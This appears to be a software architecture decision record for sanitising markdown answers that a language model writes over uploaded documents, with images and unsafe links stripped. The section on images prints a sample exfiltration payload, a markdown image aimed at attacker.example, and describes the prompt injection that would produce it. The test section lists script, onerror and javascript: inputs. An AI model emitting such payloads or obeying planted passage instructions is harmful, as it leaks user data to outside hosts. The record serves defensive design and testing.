# ADR 0004 — Answers are sanitised markdown, with images removed entirely

Status: accepted (U4, verified U6, 2026-11-01)

## Context

An answer is written by a language model over text that customers
uploaded. Both halves are attacker-influenced: the corpus is whatever
anyone in the organization uploaded, and a passage can contain
instructions aimed at the model. This is the least trustworthy string
the product handles, and it is rendered into the DOM.

Markdown is wanted — answers use lists, emphasis and code — so the
options were: render markdown as-is, render it sanitised, or render
plain text only.

## Decision

Sanitised markdown, via `react-markdown` with `rehype-sanitize` and a
**tightened** schema. Three controls:

1. **Raw HTML is stripped, not escaped-and-rendered.**
   `dangerouslySetInnerHTML` appears nowhere in the file.
2. **`img` is removed from the allowed tag list entirely.** Not
   allowlisted by host — removed.
3. **Links are limited to `http`, `https` and `mailto`**, open with
   `rel="noopener noreferrer"`, and **display their domain** next to
   the text, so a link reading "your invoice" cannot quietly point
   elsewhere.

`input` is dropped alongside `img` for the same reason: neither has a
legitimate place in an answer drawn from text passages.

## Why images are removed rather than restricted

An `<img src>` is a GET request to an arbitrary host **the moment the
answer renders**. No click is required. A prompt injection that gets
the model to emit

    ![](https://attacker.example/p?d=<text from the passage>)

exfiltrates on sight. Allowlisting hosts would not help: the attack
needs only one reachable host, and the legitimate use case is zero —
answers are drawn from text passages, so there is no image to show.

## Consequences

- An answer cannot contain an image even if a document legitimately
  references one. Accepted; the source passage is shown in the panel
  and the document itself is the place for images.
- The sanitiser schema is a fork of `defaultSchema`, so a
  `rehype-sanitize` upgrade that widens the default widens ours too
  unless the fork is re-checked. The mutation check below is what
  makes that visible.
- Citation markers are turned into chips on the **rendered children**,
  not by rewriting the markdown source, so a `[1]` inside a code fence
  stays literal text.

## Verified

End-to-end test 8 streams an answer containing an `onerror` image, a
`<script>` tag, a markdown image pointing at a third-party host, and a
`javascript:` link. It asserts:

- none of the three injected globals is set;
- `main img` count is **0**;
- **no network request was made to the attacker host** (the real
  exfiltration check, not just "the tag is gone");
- no `href` begins with `javascript:`;
- surviving links carry both `noopener` and `noreferrer`.

Mutation checks, each applied alone and reverted:

| mutation | result |
|---|---|
| `u2-no-sanitize` — render markdown with no sanitiser | **CAUGHT** |
| `u3-allow-images` — put `img` back in the allowed tags | **CAUGHT** |
